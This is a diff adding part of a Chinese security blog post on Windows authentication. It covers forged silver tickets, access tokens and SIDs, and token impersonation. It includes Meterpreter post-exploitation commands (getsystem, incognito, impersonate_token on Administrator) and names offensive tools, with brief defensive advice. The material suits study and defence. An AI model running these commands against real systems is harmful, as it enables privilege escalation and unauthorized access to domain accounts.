+<h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h4><ul>
+<li>访问权限：伪造TGS，只能访问指定的服务</li>
+<li>加密方式：Silver Ticket由服务账号Hash加密</li>
+<li>认证流程：直接和服务器认，最后一步认证</li>
+</ul>
+<p>伪造白银票据的难度比伪造黄金票据的难度要小，因为一个域中的服务器如果对外的话，非常容易被入侵，并且容易被转储Server hash</p>
+<p><strong>防御</strong></p>
+<ul>
+<li>需要开启PAC认证，这会降低认证的效率，增加DC的负担，最根本的还是要加固服务器本身对外的服务</li>
+</ul>
+<h2 id="0x08-Windows-Access-Token"><a href="#0x08-Windows-Access-Token" class="headerlink" title="0x08 Windows Access Token"></a>0x08 Windows Access Token</h2><p>Windows Token其实叫Access Token（访问令牌），它是一个描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后，都会生成一个Access Token，这个Token在用户创建进程或者线程时会被使用，不断的拷贝，这也解释了A用户创建一个进程而该进程没有B用户的权限。</p>
+<ul>
+<li>Access Token分为两种（主令牌、模拟令牌）</li>
+<li>一般情况下，用户双击运行一个程序，都会拷贝”explorer.exe”的Access Token</li>
+<li>当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清清除，只有在重启机器后才会清除</li>
+</ul>
+<h3 id="Windows-Access-Token组成"><a href="#Windows-Access-Token组成" class="headerlink" title="Windows Access Token组成"></a>Windows Access Token组成</h3><ul>
+<li><p>用户账户的安全标识符（SID）</p>
+</li>
+<li><p>用户所属组的SID</p>
+</li>
+<li><p>用户标识当前登录会话的登录SID</p>
+</li>
+<li><p>用户或用户组所拥有的权限列表</p>
+</li>
+<li><p>所有者SID</p>
+</li>
+<li><p>主要组的SID</p>
+</li>
+<li><p>访问控制列表</p>
+</li>
+<li><p>访问令牌的来源</p>
+</li>
+<li><p>令牌是主要令牌还是模拟令牌</p>
+</li>
+<li><p>限制SID的可选列表</p>
+</li>
+<li><p>目前的模拟等级</p>
+</li>
+<li><p>其他统计数据</p>
+</li>
+<li><p>等等</p>
+</li>
+</ul>
+<h3 id="SID（Security-Identifiers）安全标识符"><a href="#SID（Security-Identifiers）安全标识符" class="headerlink" title="SID（Security Identifiers）安全标识符"></a>SID（Security Identifiers）安全标识符</h3><p>安全标识符是一个唯一的字符串，它可以代表一个账户、一个用户组、或者是一次登录。通常它还有一个SID固定列表，例如Everyone这种已经内置的账户，默认拥有固定的SID</p>
+<p>SID的两种表现形式：</p>
+<ol>
+<li>域SID-用户ID</li>
+<li>计算机SID-用户ID</li>
+</ol>
+<p>SID列表都会存储在域控的AD或者计算器本地账户数据库中</p>
+<h3 id="Windows-Access-Token产生过程"><a href="#Windows-Access-Token产生过程" class="headerlink" title="Windows Access Token产生过程"></a>Windows Access Token产生过程</h3><p>每个进程创建时都会根据登录会话权限由LSA（Local Security Authority）分配一个Token</p>
+<p>如果进程CreateProcess时自己指定了Token，LSA会用该Token，否则向父进程TOken拷贝一份</p>
+<h3 id="Windows-Access-Token令牌假冒实战"><a href="#Windows-Access-Token令牌假冒实战" class="headerlink" title="Windows Access Token令牌假冒实战"></a>Windows Access Token令牌假冒实战</h3><p>当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清清除，只有在重启机器后才会清除</p>
+<p>可以使用多种工具查看目前系统上存在的模拟令牌</p>
+<ul>
+<li>Incognito</li>
+<li>Powershell-Invoke-TokenManipulation.ps1</li>
+<li>Cobalt Strike-steal_token</li>
+</ul>
+<p>MSF中集成了Incognito</p>
+<p>meterpreter &gt; getsystem                         获取system权限</p>
+<p>meterpreter &gt; load incognito</p>
+<p>meterpreter &gt; list_tokens -u                     查看会话中有哪些可以伪造的令牌</p>
+<p>meterpreter &gt; impersonate_token “PAYLOADS\ \Administrator”</p>
+<p>PAYLOADS\ \Administrator是上面列表中的用户名</p>
+<p>防御：禁止域管（Domain Admins）登录没有安全加固的服务器，清除假冒可以重启服务器</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Windows%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81/" rel="tag"># Windows基本认证</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/22/Typora+PicGo+gitee%E5%9B%BE%E5%BA%8A/" rel="prev" title="Typora+PicGo+Gitee图床">
+      <i class="fa fa-chevron-left"></i> Typora+PicGo+Gitee图床
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/05/14/hello_pwn/" rel="next" title="hello_pwn">
+      hello_pwn <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81"><span class="nav-number">1.</span> <span class="nav-text">0x01 本地认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM%EF%BC%88NT-LAN-Manager%EF%BC%89Hash"><span class="nav-number">1.1.</span> <span class="nav-text">NTLM（NT LAN Manager）Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LM-Hash"><span class="nav-number">1.2.</span> <span class="nav-text">LM Hash</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81"><span class="nav-number">2.</span> <span class="nav-text">0x02 网络认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM%EF%BC%88NT-LAN-Manager%EF%BC%89"><span class="nav-number">2.1.</span> <span class="nav-text">NTLM（NT LAN Manager）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8C%91%E6%88%98%EF%BC%88Challenge%EF%BC%89-%E5%93%8D%E5%BA%94%EF%BC%88Response%EF%BC%89"><span class="nav-number">2.1.1.</span> <span class="nav-text">挑战（Challenge）&#x2F;响应（Response）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-v2%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.2.</span> <span class="nav-text">NTLM v2协议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Pass-The-Hash%EF%BC%88%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">0x03 Pass The Hash（哈希传递）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%9F%9F%E8%AE%A4%E8%AF%81"><span class="nav-number">4.</span> <span class="nav-text">0x04 域认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81"><span class="nav-number">4.1.</span> <span class="nav-text">kerberos域认证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E8%AE%A4%E8%AF%81%E5%A4%A7%E8%87%B4%E6%B5%81%E7%A8%8B"><span class="nav-number">4.2.</span> <span class="nav-text">域认证大致流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E8%AE%A4%E8%AF%81%E8%AF%A6%E7%BB%86%E6%B5%81%E7%A8%8B"><span class="nav-number">4.3.</span> <span class="nav-text">域认证详细流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E4%BC%AA%E9%80%A0%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%EF%BC%88Silver-Ticket%EF%BC%89"><span class="nav-number">5.</span> <span class="nav-text">0x05 伪造白银票据（Silver Ticket）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E4%BC%AA%E9%80%A0%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%EF%BC%88Golden-Ticket%EF%BC%89"><span class="nav-number">6.</span> <span class="nav-text">0x06 伪造黄金票据（Golden Ticket）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-Tickets%EF%BC%88%E7%A5%A8%E6%8D%AE%EF%BC%89%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">0x07 Tickets（票据）总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-number">7.0.1.</span> <span class="nav-text">黄金票据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="nav-number">7.0.2.</span> <span class="nav-text">白银票据</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-Windows-Access-Token"><span class="nav-number">8.</span> <span class="nav-text">0x08 Windows Access Token</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token%E7%BB%84%E6%88%90"><span class="nav-number">8.1.</span> <span class="nav-text">Windows Access Token组成</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SID%EF%BC%88Security-Identifiers%EF%BC%89%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86%E7%AC%A6"><span class="nav-number">8.2.</span> <span class="nav-text">SID（Security Identifiers）安全标识符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token%E4%BA%A7%E7%94%9F%E8%BF%87%E7%A8%8B"><span class="nav-number">8.3.</span> <span class="nav-text">Windows Access Token产生过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92%E5%AE%9E%E6%88%98"><span class="nav-number">8.4.</span> <span class="nav-text">Windows Access Token令牌假冒实战</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Beytagh"
+      src="/uploads/beytagh.jpg">
+  <p class="site-author-name" itemprop="name">Beytagh</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Beytagh</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
